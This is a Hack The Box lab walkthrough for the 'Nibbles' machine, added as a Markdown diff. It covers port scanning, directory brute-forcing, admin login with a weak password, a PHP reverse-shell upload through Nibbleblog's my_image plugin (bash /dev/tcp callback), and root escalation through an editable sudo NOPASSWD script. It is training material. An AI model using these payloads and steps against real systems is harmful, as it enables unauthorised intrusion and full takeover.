@@ -1,0 +1,166 @@
+# 💥 Hack The Box – Nibbles
+
+**IP:** 10.129.96.84  
+**OS:** Linux  
+**Difficulty:** Easy  
+**Status:** ✅ Rooted
+
+---
+
+## 🛠️ Workspace Setup
+
+```bash
+mkdir Nibbles && cd Nibbles
+echo "10.129.96.84 Nibbles" | sudo tee -a /etc/hosts
+```
+
+---
+
+## 🔍 Full Port Scan
+
+```bash
+nmap -sS -sV -sC -p- -T4 -Pn -oN fullscan.txt Nibbles
+```
+
+📌 Result:
+- Port 22 (SSH)
+- Port 80 (HTTP)
+
+---
+
+## 🌐 Web Enumeration
+
+### Visit Website
+
+- `http://Nibbles` shows default "Hello world" page.
+- Page source reveals a possible subdirectory.
+
+### Discovered path:
+
+```text
+http://Nibbles/nibbleblog
+```
+
+### Dirbusting with dirsearch
+
+```bash
+source /path/to/venv  # if needed
+python3 /opt/dirsearch/dirsearch.py -u http://Nibbles/nibbleblog \
+  -x 400,500 -t 50 \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
+  -e php,.bak,.zip,.sql,.env,.inc,.js,.old
+```
+
+---
+
+## 🔎 Version Discovery
+
+Found:
+```
+Nibbleblog v4.0.3
+```
+
+→ [Source code](https://github.com/dignajar/nibbleblog)
+
+---
+
+## 🔓 Admin Panel Access
+
+```text
+http://Nibbles/nibbleblog/admin.php
+```
+
+✅ Logged in with:
+- **Username:** admin
+- **Password:** nibbles
+
+---
+
+## 💣 Exploitation – Authenticated File Upload → RCE
+
+Discovered vulnerable plugin: **my_image**
+
+### Payload: Reverse shell PHP
+
+Save as `image.php`:
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/tun0/1234 0>&1'");
+?>
+```
+
+Start listener:
+```bash
+nc -lvnp 1234
+```
+
+Upload the file via admin panel and trigger:
+```text
+http://Nibbles/nibbleblog/content/private/plugins/my_image/image.php
+```
+
+---
+
+## 🧠 Shell Upgrade
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+---
+
+## 🔍 Post-Exploitation
+
+```bash
+cd /home/nibbler
+cat user.txt
+```
+
+---
+
+## 🔼 Privilege Escalation
+
+### Check sudo permissions:
+
+```bash
+sudo -l
+```
+
+Output:
+```text
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+→ Editable script. Modify with root shell payload:
+
+```bash
+cd /home/nibbler/personal/stuff
+printf '#!/bin/sh\n/bin/bash -i\n' > monitor.sh
+chmod +x monitor.sh
+```
+
+### Execute as root:
+
+```bash
+sudo /home/nibbler/personal/stuff/monitor.sh
+whoami  # root
+```
+
+---
+
+## 🏁 Root Access
+
+```bash
+cd /root
+cat root.txt
+```
+
+---
+
+## 🧾 Notes
+
+- 🐚 Reverse shell via vulnerable plugin in admin panel
+- 📤 File upload bypass led to code execution
+- 🔼 Privilege escalation via sudo NOPASSWD editable script
+- ✅ Full root obtained
